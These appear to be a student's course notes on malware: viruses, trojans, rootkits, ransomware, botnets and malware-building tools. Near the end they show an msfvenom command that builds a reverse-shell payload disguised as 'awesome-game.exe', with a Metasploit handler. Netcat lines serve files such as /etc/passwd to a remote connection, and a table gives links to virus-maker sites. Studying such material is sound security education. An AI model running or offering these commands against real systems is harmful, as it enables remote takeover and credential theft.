### 7.1 Introduction to MALWARE

Malware is a file, program or string of code used for malicious activity, such as damaging devices, demanding ransom and stealing sensitive data.
Classified by the payload or malicious action it performs

- Typically delivered over a network
- Can also be delivered via physical media
- mostly downloaded from the internet with or without the user's knowledge
- Social engineering is often used to trick users into installing malware

#### Types of Malware
Viruses
Worms
Trojans
Ransomeware
Bots
Adware
Spyware
Browser hijackers
Rootkits
Keyloggers
Fileless malware
Malvertising

#### How Malware Works
Two phases to malware
- Infection phase
	- A virus is planted on a target system
	- It replicates itself and attaches to one or more executable files
- Attack phase
	- The infected file is executed accidentally by the user, or in some way is deployed and activated.

#### MALWARE Components

| Component                 | Description                                                                                                                     |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Cryptor                   | Software that uses encryption and obfuscation to make the malware hard to detect                                                |
| Obfuscator                | A process that makes the malware's text/binary data difficult to understand or recognize could be part of cryptor functionality |
| Dropper/Stager/Downloader | A small file that establishes an initial foothold on the compromised machine. then Downloads the bulk of the malware            |
| Stage                     | The larger exploit that the dropper downloads                                                                                   |
| Exploit                   | An application designed to take advantage of a specific vulnerability. Can be a stage. Usually carries a paylaod                |
| Payload                   | The actual malware that the attacker wants to run on the victim's computer                                                      |
| Packer                    | A program that bundles all of the malware files together into a single compressed executable.                                   |
| Wrapper                   | A program that hides a trojan inside another application                                                                        |
| Injector                  | Malware that injects itself into other processes or files, making it harder to detect                                           |
| Malicious Code            | Harmful programming instrcutions designed to exploit system vulernabiliteies                                                    |
|                           |                                                                                                                                 |

> Malware is bigger category that includes viruses


- Both Viruses and worms can spread across the network
- Viruses need the help of human intervention
- Worms can act independently. They do not need human help

#### Malware Vs Exploit
- The terms malware and exploit are often used together, but they are not the same,
- Malware often uses exploits to infect a system
- Malware is program used for malicious activity.
	- It is inherently malicious
	- Its code is designed to cause damage
- An exploit is a program that takes advantage of a weakness (vulnerability)
	- Use to hack into systems
	- Not inherently malicious
	- It is a delivery mechanism
	- Its code is designed to break into a system. But not to (itself) cause damage
	- However, it is typically used for malicious purposes.
		- It can deliver a malicious payload
		- It can be used to establish a backdoor or advanced persistent threat in the target network

### HOW MALWARE GETS ONTO SYSTEMS
- Black hat search Engine Optimization (SEO) manipulation
	- Ranking malicious / compromised websites highly in search results
- Social engineering / Click-jacking
	- Tricking users into clicking an innocent-looking link that leads to a malicious site
- Phishing / Spear phishing / Whaling
	- Sending fake emails that entice a user to click a malicious link
- Malvertising
	- Embedding malware in ad networks
		- These appear on hundreds of legitimate sites
- Compromised legitimate sites
	- Hosting embedded malware that spreads to visitors
- Drive-by downloads
	- Exploiting flaws in browser software to install malware by just visiting a webpage
- Malicious links in email , social media, SMSs and instant messaging
- Infected removable media
- Infected emails attachments
- Legitimate software packaged by a disgruntled employee
- Compromises in the software supply chain
- Browser and emails software bugs
- File sharing sites/ mobile app stores
	- users download fake or compromised programs
- Untrusted sites that offer freeware
- Downloading files, games and screensavers from internet sites
- Using administrative utilities such as the psexec suite in a malicious way
	- make a connection to the device
	- Then upload a trojan, logic bomb and backdoor

#### Indicators of MALWARE Infection
- Strange popups or alerts
- Browser window or apps freeze frequently
- Computer slows down when running normal applications
- Computer periodically freezes or becomes unresponsive
- Files an folders are missing or renamed
- Drive labels change
- Unexplained or excessive hard drive activity
- Unexplained inbound or outbound network connection attempts
- Unexpected open ports
- Unable to boot operating system
- Any type of abnormal activity
\
Phase 1: Infection
	Stage 1: System exploit
	Stage 2: Binary (Dropper loading)
Phase 2: Callback
	Stage 3: Callback
	Stage 4: Data exfiltration


### 7.2 Viruses
#### INTRODUCTION TO VIRUSES
- A self replicating program
- Cannot reproduce/spread without help. Usually requires (unwitting) human intervention or assistance
- Inserts or attaches itself to a legitimate program or document in order to execute its code.
- Viruses are usuually transmitted through file downloads infected removable disk drives, flash drives, and email attachments
- Common Virus characteristics
	- Infects other programs
	- Alters data
	- Transform itself
	- Corrupts files and programs
	- Encrypts itself
- Computer Virus Lifecycle
	- Creation : Virus program is created
	- Replication: Virus is copied from PC to PC
	- Activation Virus Launches and delivers destructive payload
	- Discovery: Virus is detected and documented
	- Assimilation: Antivirus companies modify their programs to include the virus
	- Eradication: Use of antivirus software eliminates the virus threat

#### MOTIVATION FOR CREATING VIRUSES
- Advanced persistent threat
- Creating a botnet
- Bragging rights
- Cause damage to an individual or organization
- Receive financial benefits
- Used for research projects
- Play a trick
- Cause vandalism 
- Perpetrate cyber terrorism
- Distribute ideological message (Political, religious, etc.)

#### VIRUS TYPES
- TSR (Transient Virus (Disappears after running) , Terminate and Stay Resident(Loads itself into memory and stays there)
- Boot Sector:
	- A boot sector virus moves the master boot record (MBR) to another location on the hard disk and copies itself to the original location of MBR
	- When the affected system boots the virus code is executed first. Then control is passed to the original MBR (BIOS --> MBR --> Partition Boot Sector --> Operating System)
- File: 
	- Infected files which are executed or interpreted by the system including .exe, .sys, .com, .dll, .bat , etc. Can be either direct-action (non-resident) or memory resident
- Multipartite
	- Infects the system boot sector and executables files at the same time
	- Attempts to infect both boot sector and files
	- Generally refers to viruses with multiple infection methods
- Cluster
	- Modified directory table entries
		- They point users or system processes to the virus code rather than the actual application. 
	- Only one copy of the virus is stored on disk, but infects all application on the computer
	- When the legitimate application launches:
		- Cluster virus runs first
		- The legitimate app runs next
- Macro
	- Written in a macro language
	- Platform independent
	- Macro Viruses
		- Infect files create by Microsoft word or excel
		- Most are written using visual basic for applications (VBA)
		- Infect templates or convert infected documents into template files, while appearing 
- Compression
	- An example of "benevolent" computer virus
	- More of a nuisance than a malicious atack
	- Searches for uninfected executable filles
	- Compresses the file and prepends itself to it
	- Decompresses and executes the file as needed


#### SELF-Hiding VIRUS
- Cavity
	- AKA file overwriting virus
	- Overwrites portions of host files. Usually White Space nulls in the file
	- Does not increase the lenght of the file
	- Preserves original file functionality
	- Difficult to detect
- File Extension
	- Takes advantage of a user convenience feature that hides common file extensions for known file types
	- Names the infected file something like "Goodfile.txt.exe" or funny cats.avi.exe
	- Since "exe" is known file type Windows doesn't show that extension
	- The user then opens the file, thinking it is benign
	- The Original file might be run/ Opened to allay suspicion, but the virus also runs in the background
- Companion / Camouflage
	- Compromises a feature of DOS that enables software with the same name .but different extension, to operate with different priorities
	- For Example
		- You may have program.exe on your computer
		- The Virus may create a file called program.com
		- When the computer executes program.exe the virus runs program.com before program.exe is executed
		- In many cases, the real program also runs
			- Users believe that the system is operating normally
			- They aren't aware that a virus was run on the system
- Shell
	- Wraps around an application's code
	- When the application runs
		- The virus code runs first
		- Then the legitimate application code runs
		- 
- Add-on:
	- Add-on viruses
		- Append their code to the host code without making any changes to the host code
		- Inserts code at the beginning of the valid code
	- Intrusive viruses
		- Overwrites the host code partly or complete
- Stealth
	- Evades antivirus software by intercepting request to the operating system
	- Hidden by intercepting the antivirus software request to read the file and passing the request to the virus instead of the operating system
	- Virus then returns and uninfected version of the file to the antivirus software that makes it appear clean
	- Stealth Virus hides the modifications it has made. Masks the size of the file it infected
	- Tricks antivirus software
		- Intercepts antivirus request to the OS
		- Provides false information to the antivirus process
		- Might temporarily remove itself from the file it infected.
- Encryption
	- Uses simple encryption to encipher the virus code
	- Virus uses a different encryption key for each infected file
	- Evades antivirus detection because the signature keeps changing
	- Used by ransomware
- Polymorphic
	- Mutates while keeping the original algorithm intact
	- To enable the virus must have a polymorphic engine (mutating engine)
	- When well-written no parts remain the same on each infection
	- Produces varied but operational copies of itself
	- May have no parts that remain identical between infections
	- Very hard to detect using signatures
- Metamorphic
	- Self-garbling
	- Rewrites itself every time it infects a new file
	- Can reprogram itself by translating its own code into a temporary representation and then back to normal code
- Sparse Infector
	- Infects only occassionally (eg. every 10th file)
	- Might only infect files that are a certain size
	- Harder to detect

#### WORMS
- A self replicating type of malware that does not require user intervention or another application to act to act as a host for its to replicate
- Often used to enlist zombies into a botnet
- Can be distributed via email attackements
	- They usually have double extensions (for example, .mp4.exe ,or avi.exe)
	- They recipient would think that they are media files and not malicious computer programs
- Recent Examples:
	- WannCry Ransome worm
		- Search for windows machines that are vulnerable to EthernalBlue buffer overflow
		- Installs WannCry ransomware
	- Ghost Eye Worm
		- Uses random messaging on Facebook and other sites to perform a host of malicious efforts
#### WORM EXAMPLES
Badtrans
Conficker
Struxnet
Morris
Code Red II : around 359k computers were infected within 14 hours
Nimda
ILOVEYOU
SQL Slammer
Sasser
#### Worm Maker Example
- InternetWormMaker Thing v4
- 

### 7.3 TROJANS
- AKA Trojan horse
- A malicious program hidden inside of another program. Usually embedded into a legitimate application that the victim willingly installs
- Executes malicious activities in the background without the user's knowledge
- 

#### How HACKERS use Trojans
- Remote control the victims' machine
- Delete or replace operating systems' critical files
- Record screenshots, audio and video of the target computer
- Install keylogger to steal passwords, security codes, credits card numbers, etc
- Use taget computer for spamming and blasting emails messages
- Download spyware, adware , and malicious files
- Disable firewalls and antivirus software
- Create backdoors for remote access
- Infect the target computer as a proxy server for relay attacks
- Use the target computer as a botnet zombie for relay attacks
- Use the target computer as a botnet zombie to generate DDos attacks

#### COMMON TROJANS AND THEIRS PORTS

| TCP PORT | Name of Trojan                                                                       |
| -------- | ------------------------------------------------------------------------------------ |
| 2        | Death                                                                                |
| 20       | Senna spy                                                                            |
| 21       | Blade runner, Doly Trojan, Fore invisible FTP, WebEx, WinCrash                       |
| 23       | Tiny Telnet server, Antigen, Email Password Sender, Haebu Coceda , Shtrilitz Stealth |
| 25       | Terminator, WinPC, WinSpy, Kuang 0.17A-0.30                                          |
| 31       | Hackers paradise                                                                     |
| 80       | Executor                                                                             |
| 456      | Hacker paradise                                                                      |
| 555      | Ini-Killer, Phase Zero, Stealth Spy                                                  |
| 666      | Satanz Backdoor                                                                      |
| 1001     | Silencer, WebEx                                                                      |
| 1011     | Doly Trojan                                                                          |
| 1170     | Psyber Stream Server, voice                                                          |

#### HTTP /HTTPS TROJAN
- ByPasses a firewall
- Spawns a child Program
	- Executed on the internal host
	- Spawns a child at a scheduled time
- Access the internet
	- Child program looks like an internal user to the firewall
	- It makes an outbound connection to the attacker
#### SHTTPD TROJAN - HTTPS (SSL)
- SHTTPD is small HTTP server that can be embedded in any program
- Can be wrapped with a legitimate program
- When executed it will transform the target computer into a invisible web server

#### FTP TROJAN
- installs an FT{p Server and opens FTP ports on the target computer
- An attacker can then connect to the target computer using an FTP client than download files that exist on the target computer

#### DEFACEMENT TROJAN
Allows the attacker to view and edit almost any part of a compiled windows program including
menu, dialog boxes, icons strings, bitmaps, logos, etc

#### PROXY SERVER TROJAN
- Usually a standalone application
- Starts a hidden proxy server on the target computer
- Allows a remote attacker to use the target computer as a proxy to connect to the Internet
- Thousands of computers on the Internet are infected with proxy serves using this technique.

#### REMOTE ACCESS TROJAN (RAT)
Malicious program that run on system and allow intruders to access and use a system remotely.
Works like remote desktop access
Attacker gains complete graphic user interface (GUI ) access to the target computer remotely
To Install a RAT
	Infect target computer with server.exe
	Plant reverse connecting Trojan
	Trojan connect to port 80 to establish the reverse connection
	Attacker has complete control over target computer

#### HTTP RAT
- Display ads, records personal data/ keystrokes
- Downloads unsolicited files, disables programs / system
- Flood internet connection and distributes threats
- Tracks browsing history and activities and hijacks the browser
- Makes fraudulent claims about spyware detection and removal

#### INFAMOUSE RATS OF 2022
- Dark Watch

| RAT                  | Description                                                                                                                                        |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Dark Watchman        | Fileless RAT manipulates system settings for evasion and infects the windows Registry                                                              |
| Cloud9               | Google Chrome Extension RAT, Steals online accounts, logs keystrokes, in ads and malicious code, and enlists the victim's browser in DDos Attackes |
| ROMCOM RAT           | Impersonates KeePass, SolarWindows NPM , Veeam                                                                                                     |
| RatMilad             | Android spyware targets mobile Device in the middle east to spy on victim and steal data                                                           |
| Imminent monitor RAT | Popular amount domestics abusers , used to spy on victims devices                                                                                  |
| ZuoRat               | Targets SOHO Routers in North America , Euope                                                                                                      |
|                      |                                                                                                                                                    |
#### Command Shell Trojan
Provides the attacker the command prompt of a remote target
Opens a port on the target for the attacker to connect
A client is installed on the attacker's computer to make the connection


#### NetCat Backdoor
Provides a backdoor command prompt nc -l -p 4444 < ~/myfile 
Netcat Setup up a listener on TCP port 4444
A hacker uses netcat to make connection to the listener:
	`nc <vitim IP 4444`
When netcat detects the connection, it sends the file myfile from the user's home directory to the attacker

#### TROJAN SCEARNIO
What does the following command do:
	`nc -l -u -p5555 < /etc/passwd`
Ans: Netcat setup a back door listener on UDP port 55555. When a client connects to the port, it will exfiltrate the /etc/passwd file, sending it to the client

#### VNC TROJAN
Starts a VNC server daemon in the target system
VNC is considered a legitimage remote control utility
Attacker connects to the target using any VNC viewer
Because VNC is commonly used by sysadmins for routine server administration, it is hard to tell if the connection is legitimate of from VNC trojan

#### VNC TROJAN EXAMPLE - HESPERBOT
A banking Trojan with common trojan feature including
	Keystroke logging
	Capturing screenshots and video
	Configuring remote proxies
Creates a hidden VNC server for the attacker to connect to the target remotely
VNC does not log the user off the way RDP does
The attacker can connect to the target computer while a user is working


#### OVERT and COVERT Channels
Overt Channels
	Legitimates communication channels used by programs
Covert Channels
	Used to transport data in unintended ways
	Typically done through "tunneling" (hiding) one protocol inside another
	Used to evade detection
	Some Trojan clients use covert channels to send instructions to the Trojan Server 
	Can also be used for command and control communications.

#### ICMP Tunneling
Uses ICMP echo request and reply to carry a payload and silently access or control a target computer
Example Tools:
	Icmpsend
	Loki
	icmp.sh
	Ping Tunnel
	Ping Tower

#### E-Banking Trojan
Intercepts a target's banking account information before it is encrypted
	Sends its to the attacker's Trojan command and control center
 Steals the target's data including credit card information
	 Transmits it to remote hackers using email, FTP, IRC and other methods
Example:
	Trojan Intrusion : compromised deploys Trojan intrusion to victim
	Login credentials phone etc. : so attacker gets credentials and personal detail to attacker 
	SMS with link of Trojan: Attacker deploy trojan via sms to victim 
	Mobile Trojan : Compromised website deploy mobile trojan to victim
	Unauthorized money Transfer  : Attacker attempt to do money transfer
	SMS with Code : Verification OTP code reach to Mobile or victim
	SMS with Code  : Trojan pass that OTP to attacker
	Code : Attacker enters the OTP to complete the E-Banking transaction.

#### TYPE of E-Banking Trojans
Tan Grabber
	Trojan Intercepts valid Transaction Authentication Number (TAN) entered by the user
	Replaces the TAB with a random number that will be rejected by the bank
	Attacker can use the intercepted TAN with the user's login details
HTML Injection:
	Trojan creates fake forms fields on e-banks pages
	Fields elicit extra information (card number, date of birth, etc)
	Attacker can use to impersonate and compromise target's account
Form Grabber
	Trojan analyses POST requests and responses to target's browser
	Compromises the scramble pad authentication
	Intercepts scramble pad input as user enters customer Number and Personal Access Code

#### E-Banking Trojan Examples
The main purpose of Zeus and SpyEye is to steal bank and credit card account information FTP data, and other sensitve informtaaion from infected computers using web browsers and protected storage
SpyEye can automatically and quickly initiate online transactions
Additional E-Banking Trojans includes
	Citadel Builder
	Ice IX
	Retefe
	FluBot
	Fobber
	Banker Trojan
	Feodo
	Gozi
	GozNym
	Emotet
	Kronos
	

### 7.4 ROOTKITS
Software Put in place by attacker to obscure system compromise
Often replaces a legitimate operating system file with an infected one
Hides processes and files
Also allows for future access
Very hard to detect
	Its activities run at a very low level
	Below antivirus and other auditing software
Often used to provide advanced Persistent Threat backdoor access

#### Where ROOTKITS can be placed
Hypervisor Level : Modifies the boot sequence of a host system to load a vM as the host OS
Hardware : Hides malwares in devices or fireware
Boot Loader Level : Replaces the boot loader with one controlled by the hacker
Application Level : Replaces valid application files with Trojans
Kernel Level : Replaces kernel code with back-door code
Library Level : uses system-level calls to hide themselves

#### ROOTKIT tools
Horse Pill : Linux Kernel rootkit inside initrd
GrayFish Rootkit : Windows rootkit injected into the boot record
Firefef : Multiple component malware family
Necurs :
WindBird : 
Avatar : 
Azazel :
Zero Access
Alureon

#### ROOTKit detection methods

Integrity-based
	Hash key files and periodically check if the hash has changed
Signature-based:
	Compare all system process and executed files to a database with known rootkit signatures
Heuristic / Behavior-based:
	Look for any deviation is the system's normal activity
Runtime execution path profiling:
	Compare runtime execution paths of all system processes and executables before and after infection
Cross View Based
	Compared key elements of the OS such as system files, processes, registry keys to a know good state.

#### Detection Rootkits in Windows
Check the file system
	Save results of dir /s /b /ah  and dir /s /b /a-h compare to that of a clean system
	User WinDiff, TripWire and sigVerif to check hashes
Examine the registery
	Compare an export of `HKEY_LOCAL_MACHINE\SOFTWARE` and `HKEY_LOCAL_MACHINE\SYSTEM` to those of known clean system

#### ANTI-ROOTKIT Tools
Stinger
Avast
TDSSkiller
Malwarebytes
Rootkit buster
UnHackme
Sophos virus remove tool
F-Secure Anti-Virus
SanityCheck
GMER

#### HOW to defend against ROOTKITS

Be prepared to reinstall the OS and apps from a trusted source
Perform kernel memory dump analysis
Install rootkit scanners
Harden the system against attack
Install a HIDs / HIPS
keep System patched and monitored

> ROOTKIT SCENARIO : By attaching itself to the master boot record in a hard drive and changing the machine's boot sequence / options


### 7.5 Other Malware

##### FILELESS MALWARE
- FileLess Malware is type of a malicious software that uses legitimate program to infect a computer
- It does not rely on files and leaves no footprint, making it challenging to detect and remove
- Fileless malware has been effective in evading all but the most sophisticated security solutions
- Fileless attacks are often undetectable by antivirus, whitelisting and other traditional endpoint security solutions
Fileless Example:
- User clicks on link in spam email 
- website loads flash and trigger exploit 
- Shellcode launches PowerShell (PS) with CMD  line to download and execute payload in memory only.
- Download and in-memory execution and reflectively load code. Payload can perform exfiltration damage, exe.
- Shellcode launches PowerShell (PS) with cmd line to download and execute payload in memory only.

##### FAKE ANTIVIRUSES
- Attackers disguise malware as an antivirus and trick user/s into installing on one's system.
- Fake antiviruses damage target systems and can be consider malware

##### ADWARE
- Malicious software that automatically displays advertisements online to generate revenue for its author
- Advertisements may appear in the user interface of the software, onscreen during the installation process, on in a browser
- It can even contain Trojan horses and spyware
- Not always dangerous
- It some cases it is designed to 
	- Analyze internet sites visited
	- Present advertising content
	- Install additional programs on the device
	- Redirect your Brower to unsafe sites

##### SPYWARE
- Runs secretly on a computer
- Collects information about a person or organization without their knowledge
- Collect information about a person or organization without their knowledge
- transmits that information back to a anther entity for financial again
- Does not disrupt a device operations
- Targets sensitive information
- Can grant remote access to hackers
- Often used to steal financial or personal information
- A keylogger is a specific type of spyware

##### Logic Bomb : 
executes a program when certain event happens or a date and time arrives
##### Cryptominning malware
- Currently the predominant global malware threat
- Heavily utilizes the compromised machines resources to mine cryptocurrency
- Infects desktop computer, laptops and even mobile phone and IoT devices

#### MOBILE malware
- Malicious software specifically designed to target mobile devices
- Goal is to gain access to private data
- Common types of mobile malware include RATs, bank trojans, ransomware, cryptominning malware, advertising click fraud.
- Most commonly distributed through mobile phishing and spoofing, jailbroken/rooted devices


### 7.6 ADVANCE PERSISTENT THREATS

-  A general term that can refer to group of attackers or the methods they use
- MITRE ATT&CK currently track 135 APTs
	- Most have been assigned an APT number and are known by multiple names
	- The vast majority are from China, Russia, IRAN and North Korea
	- There are also a few from Vietnam, south America, Israel, Lebenon, the middle east and south Korea and the united states
- APT groups are sophisticated and well-funded (usually by nation states)
- Recent APT activities
	- COVID relief funds theft
	- Cryptocurrency theft
	- Money laundering
	- Government and defense contractor infiltration
	- Private sector / vertical industry infiltration
	- Supply chain infiltration
	- Data exfiltration
	- Targeted DDoS
- APTs rely heavily on social engineering, as well as software tools

#### RANSOMWARE

- AKA Data hiding or encryption Trojan
- Malicious software designed to deny access to a computer until a price is paid
- Typically encrypts files (near the entire drive) using RSA 1024 -2048 public key
	- The private key is on the attacker's C&C server
- Th e victim must pay a ransom for the attacker to provide the decryption key
	- No guarantee the key will actually be provided
	- Payment sites are typically on the TOR Network
- Usually spread through email
	- Most are trojans
	- Most add entries to the windows registry for persistence
- Example: WannCry
	- Famous rasnsomware
	- Within 24 hours had 230000 victims
	- Exploited unpatched SMB vulnerability

#### RAMSOMEWARE TYPES
- CryptorBit
	- Corrupts the first 213 or 1024 bytes of any data file it finds
	- Able to bypass Group Policy settings put in place to defend against this type of infection
	- Masquerades as legitimate antivirus software or update for popular software titles like adobe flash
- CryptoLocker
	- Similar to CryptoBit
	- Encrypts files, offering to decrypt if a payment is made by stated deadline
- CryptoDefense
	- AKA HOW_DECRYPT.txt Ransomware
	- Installs via malicious Flash or other online video players
	- Encrypts data files such as text fyles, image files, video files and office documents
- CryptoWall Ransomware
	- Easy and inexpensive for the attacker to use
- Police-Themed Ransomware
	- Appears as a warning from local law enforcement authority
	- Accuses the user of possessing pornographic or illegally downloaded material
	- Requires the user to pay a fine or be subject to arrest

> In 2022, Chinese APTs used short-lived ransomware campaigns to mask espionage:
> 	APT 41: Deployed QuasarRAT, PlugX and Cobalt Strike to steak intellectual property from Japanese firms
> 	APT 10: Used Cobalt Strike to deploy ransomware such as Rook, Pandora, AtomSilo, LockFile and Night Sky to attack Western global organization.

#### WHAT IS BOTNET?
- `A network of compromised Zombie computers
- Command and Control computers manage the zombies
	- Can be controlled over HTTP, HTTPS, IRC or ICQ
- Used to start a distributed attack
- Botnets can be instructed to do malicious tasks including
	- Distributed denial-or-service (DDoS)
	- Sending Spam
	- Delivering ransomware
	- Bitcoin Mining

#### ZOMBIES
- A Computer connected to the internet
	- Compromised by a hacker, computer virus or trojans horse program
- Can be used to perform various malicious tasks under remote direction

> There are many MaaS (Malware-as-a-Service) providers available on the Internet . AKA Rent-a-Botnet. Service offering inexpensive botnets for hire.

#### BOTNET C2 Beaconing
- AKA C&C beaconing
- A zombie will periodically check in with its C&C server
	- Typically on a regular interval
- This is known as beaconing
- Beaconing has pattern that diffrentiuates it from normal traffic
	- Regularity of its intervals
- Beaconing on common ports and protocols (such as HTTP:80 or HTTPS: 443) bobscures malicious traffic within normal traffic
- Helps the attacker evade firewalls
- Another evasion tactic involves waiting long, randomized periods of time before communicating
- The beaconing will continue until:
	- The zombie receives instruction to attack
	- the infection is cleaned

#### BOTNET TROJAN
- Malware used to turn a computer into a zombie
- The zombie will start beaconing to regularly check in with its C2 server
- When the zombie receives commands from the C2 server it will join others to launch a coordinated attack
	
#### HIT-LIST Scanning
- A way to accelerate the initial spread of a worm:
	- can abe used to rapidly build your botnet
- Start with low and slow scanning to create a hit list of vulnerable machines
- Start the worm -pass it the list
- Pass part of the list to each new infected machine
- Infected machines can also create new lists
- The scanning / infecting process will hits a threshold where increase exponentially

#### BOTNET TROJAN EXAMPLES
#Trickbot  #Mirai #Gafgyt #Meris


#### Scenario 1 : Botnet
Your IDS has alerted you that its sensor continuously observer well-known call home messages at the network boundary
You proxy firewall is properly configured to successfully drop the messags before leaving the network
Which of the following is MOST likely the cause of the call home messages being sent?
Answer:  Probably a #zombie . A call home message is an indicator of a zombie beaconing to see if it has instruction from its C2 Server.

#### Scenario 2: Botnet
Company uses the subnet range if 192.168.0.0/8
While monitoring the data, you see a high number of outbound connections
XYZ internal IP addresses are making connections to a public IP Address
After doing some research you find that the public IP is a blacklisted IP and the internal communication devices are compromized
What kind of attack does the above scenario depict?


### 7.7 MALWARE MAKERS

#### Examples : Virus Maker


| Description                | Portals                                                                         |
| -------------------------- | ------------------------------------------------------------------------------- |
| BlackHost Virus MAker      | https://www.blackhost.xyz?id=vm                                                 |
| Bhavesh Virus Maker        | https://sourceforge.net/projects/bhavesh-virus-maker                            |
| Virus maker 4.0            | https://virus-maker-software.informer.com/4.0                                   |
| Heavenlyzy Virus Maker 3.0 | https://heavenlyzy.weebly.com/blog/virus-maker-30                               |
| Github                     | 84 repos for virus maker<br>7 repos for worm maker<br>8 repos for trojan makers |
|                            |                                                                                 |

#### WRAPPER
- A wrapper hides a trojan inside a legitimate application
- Could be a game, productivity app or utility
- When the user installation application
	- The legitimate apps run in the foreground
	- The trojan runs in the background
- Wrapper examples:
	- Mpge
	- Seena Spy One Exe Maker 2000
	- Dark Horse Trojan Virus Maker
- Most trojan makers have build-in wrapper functionality




#### CRYPTOR
- Software that uses encryption and obfuscation to make malware harder to recognize
- The goal is to bypass detection by antimalware programs
- Types of Cryptors
	- Statics/Statistical cryptors
		- Use different stubs to make each encrypted file unique
		- Having a separate for each client makes it easier for malicious actors to modify or in hacking terms, Clean a stub once it has been detected by a security software
	- Polymorphic cryptors
		- Considered more advanced
		- Use state-of-the-art algorithms that utilize random variables, data, keys, decoders and so on
		- One input source file never produces an output file that is identical to the output of another source file
	- Cryptor Service are available online for reasonable fee ($10 - 100)
- Cryptor Examples
	- msfvenom
	- AIO FUD crypter
	- hidden sight crypter
	- Galaxy Cryptor
	- Criogenic crypter
	- Heaven crypter
	- Swayz Cryptor
	- Aegis  Cryptor
	- GitHub Lists 33 malware cryptor repositories

#### DROPPER
- AKA Stager
- A king of Trojan Designed to install malware to a computer
- Can be thought of as an "advance party"
	- Small in size
	- Usually does not itself contain the malware
	- Gains a foothold in the target
	- Then downloads the larger malware file
- Persistent dropper
	- Hides itself on the target
	- Modifies registry keys
	- Runs with every reboots
- Non-persistent dropper
	- Remotes itself after executing its payload

##### DROPPER EXAMPLES
- msfvenom
- nullmixer
- Github 63 malware Dropper repositories

#msfvenom can be used to create a trojan dropper / stager/ downloader . It payload platform specific to the intended target. It has a build-in obfuscation features to evade detection by the target's antivirus. It replaces the old MSFencode feature
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=hostname LPORT=4444 -f exe -a x64 -o /root/Desktop/awesome-game.exe


\\ dropper connect to its handler, and then downloads the stage (real exploit) and attacker has a setup of handler in metasploit waiting to connected by msfvenom.

metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $hostname
show options
run
```

#### Exploit kit
- AKA Crimeware kit
- A platform you can use to create and deliver exploits and payloads
- Examples:
	- Infinity Exploit Kit
		- Uses vulnerabilities of Mozilla Firefox, internet explorer and opera to install malware on a target computer
		- 






